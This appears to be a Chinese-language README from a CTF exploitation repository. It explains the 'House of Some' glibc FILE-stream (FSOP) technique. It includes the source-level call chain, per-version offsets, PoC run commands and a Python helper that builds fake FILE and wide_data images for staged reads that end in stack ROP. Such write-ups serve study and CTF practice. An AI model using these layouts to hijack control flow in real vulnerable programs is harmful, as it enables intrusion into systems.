# House of Some

## 结论

- 适用范围：**x86-64 glibc 2.23～2.43**；其中 2.23、2.24、2.29、2.30、2.31、2.39、2.40、2.43 这几个版本已经在对应的 glibc 运行时上把消费链实际跑通验证过。
- 核心效果：使用合法 `_IO_wfile_jumps` 和合法 section 内的 shifted wide vtable，把 `_IO_flush_all` 的一次 overflow 变成 `read(fd, target, length)`；再用 `_chain` 串联多个读写 FILE，形成 RWRWR，最终把 ROP 直接写到栈上返回地址之后。
- 前置能力：已知 libc 基址；有已知可写区放 fake FILE/wide data；能进行一次 libc 内指针写（典型目标是 `_IO_list_all` 或现有标准流的 `_chain`）；程序能走 `exit`/正常退出。
- 它属于 FILE/FSOP 消费链——也就是伪造字段写好之后，glibc 真正读取并触发控制转移的那条源码路径——而不是堆管理器本身提供的原语；fastbin/tcache/largebin 等操作在这里只负责把地址写进 `_IO_list_all`，并在堆上摆好这些伪造数据。

House of Some 与 House of Illusion 不是同一条底层链：

- **Some**：primary vtable 为 `_IO_wfile_jumps`，借 wide doallocate 槽平移到 `_IO_new_file_underflow`；原文发布于 2023 年。
- **Illusion**：primary vtable 直接取 `_IO_file_jumps-0x8`，借 `finish -> shifted write=read` 获得读入能力；原文发布于 2024 年。
- `Some-of-House` 工具后来默认用 Illusion 模板编排 HouseOfSome 的上层 RWRWR，所以只看当前脚本容易把两个名称误合并。

<!-- PRIMITIVE_REQUIREMENTS:START -->
## 原语要求与版本边界

| 项目 | 本手法要求 |
|---|---|
| 最小输入原语 / 信息 | libc leak；已知可写区；一次 libc 内指针写挂 FILE 链；退出/flush |
| 关键环境与不变量 | 合法 primary 与 section 内 shifted wide vtable；2.40+维护 prevchain |
| 最终输出原语 | W primitive，可编排 RWRWR、泄露 environ/栈并写 ROP |
| 版本边界应如何理解 | 2.30/2.31 wide ABI 和 2.40 双链是适配；消费路径到 2.43 仍在。完整 RWRWR 的交互顺序、栈偏移和 ROP 仍题目相关。 |
<!-- PRIMITIVE_REQUIREMENTS:END -->

## 从源码看第一跳

`_IO_flush_all_lockp` 会遍历 `_IO_list_all`。当 fake FILE 满足：

```text
fp->_mode > 0
fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
fp->vtable = _IO_wfile_jumps
```

overflow 槽进入 `_IO_wfile_overflow`。再令：

```text
wide->_IO_write_base = 0
wide->_IO_buf_base   = 0
wide->_wide_vtable   = _IO_file_jumps - 0x48
```

即可得到：

```text
_IO_flush_all
  -> _IO_wfile_overflow
    -> _IO_wdoallocbuf
      -> WDOALLOCATE(fp)                     // wide vtable + 0x68
        -> (_IO_file_jumps - 0x48) + 0x68
          -> _IO_file_jumps + 0x20
            -> _IO_new_file_underflow
              -> _IO_SYSREAD(fp, fp->_IO_buf_base,
                             fp->_IO_buf_end - fp->_IO_buf_base)
                -> read(fp->_fileno, target, length)
```

primary `_IO_wfile_jumps` 的 read 槽仍是 `_IO_file_read`，所以 underflow 内的 `_IO_SYSREAD` 不会因 wide doallocate 的 `-0x48` 平移而错位。这正是 Some 相比“直接平移 primary vtable”的关键设计。

glibc 2.24 起对 primary vtable 做 `IO_validate_vtable`；这里 primary 指针就是合法 `_IO_wfile_jumps`。stock glibc 在本范围内未对 wide vtable 做同等检查；即使题目补上相同的 section 范围检查，`_IO_file_jumps-0x48` 也应先确认仍位于 `__libc_IO_vtables`，不能假设任意发行版私有补丁都与上游语义相同。

## RWRWR 完整编排

原文所谓 RWRWR 不是“一份固定 FILE 自动打所有题”，而是利用 `_IO_flush_all` 按 `_chain` 继续遍历的特性，分阶段把新 fake FILE 写进受控区：

1. **W**：先构造第一个 Some FILE，让它的读入端从输入里读到一条更长的 fake FILE 链；这一步只需要一次 libc 指针写，把它挂到 `_IO_list_all` 上即可，后续所有阶段都会顺着这条链继续跑下去。
2. **R + W**：用一个普通的 `_IO_file_jumps` FILE 去读 `environ`，从中泄露出栈地址；与此同时链上的下一个 Some FILE 会把下一阶段要用的数据读进来，这样一次 flush 就同时完成了泄露和为下一步做准备。
3. **R + W**：拿到栈地址后就能算出具体的栈窗口，定位到当前 `_IO_flush_all` 或其调用者的返回地址；链上再下一个 Some FILE 借这次机会把最终要用的 ROP 数据写到这个返回地址之后，等着最后一步落地。
4. **R/W 最终写**：最后一步把 ROP 直接写到栈上。写入起点可以选在 canary 之后，这样前面泄露到的栈窗口就同时解决了绕开 canary 和对齐到正确返回位置这两个问题。

每次读入都会阻塞，等待下一阶段数据；远程脚本必须匹配 `_IO_flush_all` 的遍历顺序。`_chain`、fd、栈偏移、ROP gadget 和沙箱策略都要按题目确定。

## 版本变化

| glibc | `_IO_wide_data->_wide_vtable` | PoC | 说明 |
|---|---:|---|---|
| 2.23～2.29 | `+0x130` | [`poc_2.23_2.29.c`](./poc_2.23_2.29.c) | legacy codecvt ABI；2.24 才引入 primary vtable 白名单，但本链两侧均可用 |
| 2.30 | `+0xf0` | [`poc_2.30.c`](./poc_2.30.c) | `09e1b0e` 删除 legacy codecvt 函数表后的单版本过渡布局 |
| 2.31～2.43 | `+0xe0` | [`poc_2.31_2.43.c`](./poc_2.31_2.43.c) | `70c6e15` 再次缩小 `_IO_iconv_t` 后的现代布局 |

另一个独立断点是 glibc 2.40 的 [`2a99e239`](https://sourceware.org/git/?p=glibc.git;a=commit;h=2a99e2398d9d717c034e915f7846a49e623f5450)：`_IO_list_all` 改成双向链表，`FILE+0xb8` 从内部 padding 复用为 `_prevchain`。若 fake 是链表头，应填 `&_IO_list_all`；若 fake B 由 fake A 的 `_chain` 指向，应填 `&A->_chain`。单纯遍历不一定立刻消费它，但任何 unlink/finish 都会用到，完整链应始终维护该不变量。

## PoC 与运行

三份 C PoC 都会真实覆写 `_IO_list_all`，从 `fflush(NULL)` 触发进入上面描述的完整消费链，并用 pipe 配合 `memcmp` 断言 fd 数据确实写进了目标数组。它们验证的是 RWRWR 链条中关键的 W 原语与对应版本的字段布局；完整的栈上 ROP 编排仍然要按题目具体情况生成交互阶段。

```bash
./tools/run_in_docker.sh 2.23 house_of_some/poc_2.23_2.29.c
./tools/run_in_docker.sh 2.30 house_of_some/poc_2.30.c
./tools/run_in_docker.sh 2.43 house_of_some/poc_2.31_2.43.c
```

PoC 里的 `dlsym` 只是用来代替真实题目中的 libc 泄露和符号偏移计算；直接覆写 `_IO_list_all` 也只是代替把伪造 FILE“投递”（也就是写进堆或其他可控内存）到目标地址这一步。这两步都不是 House of Some 这个手法本身自带的攻击能力，实战中都要换成题目提供的漏洞原语去完成。

## Python 离线板子

[`some.py`](./some.py) 提供 `build_house_of_some`，生成 Some 第一跳 `read(fd, target, length)` 的 FILE/wide_data 镜像。

### 函数用途

构造以下调用链所需的对象：

```text
fflush(NULL)
  -> _IO_flush_all
  -> _IO_wfile_overflow
  -> _IO_wdoallocbuf
  -> WDOALLOCATE(fp) = wide vtable + 0x68
  -> (_IO_file_jumps - 0x48) + 0x68
  -> _IO_file_jumps + 0x20 = _IO_new_file_underflow
  -> _IO_file_read
  -> read(fp->_fileno, target, length)
```

`fake wide_data->_wide_vtable = _IO_file_jumps - 0x48`，配合 doallocate 槽 `+0x68` 恰好落到 `_IO_file_jumps + 0x20`。

### 对应 PoC

- [`poc_2.23_2.29.c`](./poc_2.23_2.29.c)；
- [`poc_2.30.c`](./poc_2.30.c)；
- [`poc_2.31_2.43.c`](./poc_2.31_2.43.c)。

### 版本与 ABI 偏移

| glibc | `_wide_data->_wide_vtable` 偏移 |
|---|---|
| 2.23～2.29 | `+0x130` |
| 2.30 | `+0xf0` |
| 2.31～2.43 | `+0xe0` |

2.40 起 `FILE+0xb8` 复用为 `_prevchain`，必须提供。

### 最小使用示例

```python
from some import build_house_of_some

writes = build_house_of_some(
    "2.43",
    file_addr=0x100000,          # fake FILE
    wide_addr=0x200000,          # fake wide_data
    file_jumps_addr=0x7fff0000,  # _IO_file_jumps
    wfile_jumps_addr=0x7fff0100, # 合法 primary _IO_wfile_jumps
    target_addr=0x300000,        # read 目标
    target_length=0x40,
    fd=3,                        # 输入 fd
    lock_addr=0x400000,          # 可写锁区
    list_all_addr=0x7fff0200,    # _IO_list_all 槽
    prevchain_addr=0x7fff0200,   # 2.40+ 需要
)

# 两个 MemoryWrite：FILE 镜像、wide_data 镜像
for w in writes:
    print(w.label, hex(w.address), w.data.hex())
```

### 参数

| 参数 | 含义 |
|---|---|
| `version` | 目标 glibc 版本，支持 `2.23`～`2.43`。 |
| `file_addr` | fake FILE 地址。 |
| `wide_addr` | fake `_IO_wide_data` 地址，写入 `FILE+0xa0`。 |
| `file_jumps_addr` | 目标 libc 的 `_IO_file_jumps` 地址；用于计算 `file_jumps - 0x48`。 |
| `wfile_jumps_addr` | 目标 libc 的 `_IO_wfile_jumps` 地址；作为合法 primary vtable 写入 `FILE+0xd8`。 |
| `target_addr` | 第一跳 `read` 写入的目标地址。 |
| `target_length` | 第一跳读取长度。 |
| `fd` | 第一跳 `read` 使用的文件描述符。 |
| `lock_addr` | fake FILE `_lock` 指向的可写锁区。 |
| `list_all_addr` | `_IO_list_all` 槽地址，用于说明/校验链关系。 |
| `prevchain_addr` | 2.40+ 必须提供 `_IO_list_all` 槽地址，写入 `FILE+0xb8`；通常等于 `list_all_addr`。 |

### 返回对象

返回两个 `MemoryWrite`。`MemoryWrite` 每个成员含义：

| 成员 | 含义 |
|---|---|
| `address` | 要写入的绝对地址。 |
| `data` | 要写入的小端字节串（`bytes`）。 |
| `label` | 该写入的用途标签，用于调试和识别。 |

各写入内容：

```text
FILE（file_addr 处，0xe0 字节）：
    +0x00  _flags = IO_LINKED (0x80)
    +0x18/+0x20/+0x28  _IO_read_base/_ptr/_end = target_addr
    +0x30  _IO_write_end = target_addr + target_length
    +0x38  _IO_buf_base = target_addr
    +0x40  _IO_buf_end = target_addr + target_length
    +0x70  _fileno = fd (4 字节)
    +0x98  _codecvt = 0
    +0xa0  _wide_data = wide_addr
    +0xc0  _mode = 2
    +0xd8  vtable = wfile_jumps_addr
    +0xb8  _prevchain（仅 2.40+）

wide_data（wide_addr 处，到版本槽位）：
    +0x18  _IO_write_base = 0
    +0x20  _IO_write_ptr = 1
    +0x30  _IO_buf_base = 0
    +版本槽  _wide_vtable = file_jumps_addr - 0x48
```

### 调用者必须提供

```text
libc 基址和 _IO_file_jumps/_IO_wfile_jumps 地址
一次 libc 内指针写，把 fake FILE 挂到 _IO_list_all 或 _chain
能触发 fflush(NULL)/exit 的入口
2.40+ 的 _IO_list_all 地址
```

### 函数不负责

```text
不把 fake FILE 挂到 _IO_list_all
不负责链式 RWRWR 的后续阶段
不触发 fflush(NULL)
不匹配 _IO_flush_all 的遍历顺序
```

## 源码与原始资料

- [House of Some 原始文章](https://blog.csome.cc/p/house-of-some/)
- [Some-of-House 自动化工具](https://github.com/CsomePro/Some-of-House)
- [glibc `genops.c`：`_IO_flush_all_lockp`](https://github.com/bminor/glibc/blob/master/libio/genops.c)
- [glibc `wfileops.c`：`_IO_wfile_overflow`](https://github.com/bminor/glibc/blob/master/libio/wfileops.c)
- [glibc `wgenops.c`：`_IO_wdoallocbuf`](https://github.com/bminor/glibc/blob/master/libio/wgenops.c)
- [glibc 2.30 `09e1b0e`](https://sourceware.org/git/?p=glibc.git;a=commit;h=09e1b0e3f6facc1af2dbcfef204f0aaa8718772b)
- [glibc 2.31 `70c6e15`](https://sourceware.org/git/?p=glibc.git;a=commit;h=70c6e15654928c603c6d24bd01cf62e7a8e2ce9b)
